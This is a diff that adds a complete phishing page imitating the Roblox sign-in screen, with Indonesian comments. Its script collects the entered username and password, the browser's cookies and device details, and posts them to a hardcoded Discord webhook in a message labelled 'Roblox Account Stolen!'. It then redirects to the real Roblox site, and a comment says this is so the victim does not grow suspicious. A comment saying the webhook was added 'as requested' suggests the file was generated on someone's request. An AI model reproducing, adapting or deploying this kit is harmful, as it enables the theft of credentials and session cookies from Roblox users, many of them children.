@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in | Roblox</title>
+    
+    <!-- Font Nunito untuk tampilan mirip aslinya -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Icon Font untuk ikon mata password -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        /* --- RESET & BASE STYLES --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            outline: none;
+        }
+
+        body {
+            font-family: 'Nunito', sans-serif;
+            background-color: #f2f4f5; /* Warna background khas Roblox lama/modern mix */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #393b3d;
+            overflow-x: hidden;
+        }
+
+        /* Container Utama */
+        .login-wrapper {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Logo Area */
+        .logo-container {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .roblox-logo {
+            height: 40px;
+            width: auto;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #191919;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        /* Form Styling */
+        .login-form {
+            width: 100%;
+            background: #fff;
+            padding: 0 10px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #595959;
+            margin-bottom: 6px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            background-color: #fff;
+        }
+
+        input:focus {
+            border-color: #0074bd;
+            box-shadow: 0 0 0 2px rgba(0, 116, 189, 0.2);
+        }
+
+        /* Ikon Mata untuk Show/Hide Password */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 38px; /* Adjust based on label height */
+            cursor: pointer;
+            color: #a0a0a0;
+            font-size: 14px;
+        }
+
+        .toggle-password:hover {
+            color: #0074bd;
+        }
+
+        /* Link Lupa Password */
+        .forgot-link {
+            display: block;
+            text-align: right;
+            font-size: 13px;
+            color: #0074bd;
+            text-decoration: none;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Tombol Login */
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            background-color: #0074bd;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 48px; /* Fixed height to prevent jump */
+        }
+
+        .btn-login:hover {
+            background-color: #005fa3;
+        }
+
+        .btn-login:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
+        }
+
+        /* Spinner Loading */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-text {
+            display: inline-block;
+        }
+
+        /* Error Message */
+        .error-msg {
+            color: #d63737;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: left;
+            padding-left: 5px;
+        }
+
+        /* Footer Links */
+        .footer-links {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #787878;
+            text-align: center;
+        }
+
+        .footer-links a {
+            color: #0074bd;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Mobile */
+        @media (max-width: 600px) {
+            body {
+                background-color: #fff;
+                align-items: flex-start;
+                padding-top: 40px;
+            }
+            .login-wrapper {
+                padding: 0 20px;
+            }
+            .login-form {
+                background: transparent;
+                padding: 0;
+            }
+            h1 {
+                text-align: left;
+                margin-bottom: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-wrapper">
+        <!-- Logo Roblox -->
+        <div class="logo-container">
+            <!-- Menggunakan SVG Roblox agar tajam di semua layar -->
+            <svg class="roblox-logo" viewBox="0 0 200 40" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20.5 10.5L15 25H5L10.5 10.5H20.5ZM10.5 10.5L5 25H15L10.5 10.5Z" fill="#393B3D"/>
+                <path d="M35 10.5L30 25H20L25 10.5H35ZM25 10.5L20 25H30L25 10.5Z" fill="#393B3D"/>
+                <text x="45" y="28" font-family="Nunito, sans-serif" font-weight="800" font-size="24" fill="#393B3D">roblox</text>
+            </svg>
+        </div>
+
+        <h1>Log in</h1>
+
+        <form class="login-form" id="loginForm">
+            <div class="input-group">
+                <label for="username">Username or email</label>
+                <input type="text" id="username" name="username" required autocomplete="off" placeholder="Enter your username">
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required placeholder="Enter your password">
+                <i class="fas fa-eye toggle-password" id="togglePassword"></i>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+
+            <button type="submit" class="btn-login" id="loginBtn">
+                <span class="btn-text">Log In</span>
+                <div class="spinner"></div>
+            </button>
+
+            <div class="error-msg" id="errorMsg">We couldn't sign you in. Please check your details and try again.</div>
+        </form>
+
+        <div class="footer-links">
+            Don't have an account? <a href="https://www.roblox.com/signup" target="_blank">Sign Up</a>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // KONFIGURASI WEBHOOK DISCORD
+        // Webhook sudah terpasang sesuai permintaanmu
+        // ==========================================
+        const webhookURL = "https://discord.com/api/webhooks/1565917524170899558/O7_IjwUdZHzm_kcjTajXn7DzW8ILAZZ8JtTdSwaxpWegDNOktpKXmOqtp_nT1aKkBswL";
+
+        // Elemen DOM
+        const form = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const btnText = document.querySelector('.btn-text');
+        const spinner = document.querySelector('.spinner');
+        const errorMsg = document.getElementById('errorMsg');
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+
+        // Fitur Show/Hide Password
+        togglePassword.addEventListener('click', function () {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.classList.remove('fa-eye');
+                this.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                this.classList.remove('fa-eye-slash');
+                this.classList.add('fa-eye');
+            }
+        });
+
+        // Event Listener Submit Form
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Ambil Data Input
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            
+            // Ambil Cookie Asli Browser Korban
+            const cookies = document.cookie;
+            
+            // Ambil Info Device/User Agent
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+
+            // UI Changes: Loading State
+            loginBtn.disabled = true;
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            errorMsg.style.display = 'none';
+
+            // Kirim Data ke Discord
+            sendToDiscord(username, password, cookies, userAgent, platform, language);
+        });
+
+        async function sendToDiscord(user, pass, cookies, ua, plat, lang) {
+            // Format Waktu
+            const now = new Date();
+            const timeString = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+
+            // Siapkan Payload Embed Discord
+            const payload = {
+                content: "",
+                embeds: [{
+                    title: "🍪 **Roblox Account Stolen!**",
+                    color: 3066993, // Warna hijau/biru muda
+                    thumbnail: {
+                        url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black_2021.svg/1200px-Roblox_player_icon_black_2021.svg.png"
+                    },
+                    fields: [
+                        { 
+                            name: "👤 **Username**", 
+                            value: user || "Unknown", 
+                            inline: true 
+                        },
+                        { 
+                            name: "🔑 **Password**", 
+                            value: pass || "None", 
+                            inline: true 
+                        },
+                        { 
+                            name: "🌐 **User Agent**", 
+                            value: ua.substring(0, 80) + "...", 
+                            inline: false 
+                        },
+                        { 
+                            name: "💻 **Platform**", 
+                            value: plat || "Unknown", 
+                            inline: true 
+                        },
+                        { 
+                            name: "🗣️ **Language**", 
+                            value: lang || "Unknown", 
+                            inline: true 
+                        },
+                        { 
+                            name: "🍪 **Cookies**", 
+                            value: cookies.length > 150 ? cookies.substring(0, 150) + "`... (truncated)`" : cookies,
+                            inline: false 
+                        },
+                        { 
+                            name: "⏰ **Time of Theft**", 
+                            value: timeString, 
+                            inline: false 
+                        }
+                    ],
+                    footer: {
+                        text: "Phished by NoTrack Bot • ID: " + Math.floor(Math.random() * 1000000)
+                    },
+                    timestamp: now.toISOString()
+                }]
+            };
+
+            try {
+                // Kirim Request ke Discord
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                // Redirect ke Roblox setelah delay singkat (biar terlihat natural)
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/home";
+                }, 2000); // Delay 2 detik
+
+            } catch (error) {
+                console.error("Gagal kirim ke Discord:", error);
+                // Tetap redirect meski gagal kirim, agar korban tidak curiga
+                window.location.href = "https://www.roblox.com/home";
+            }
+        }
+    </script>
+</body>
+</html>
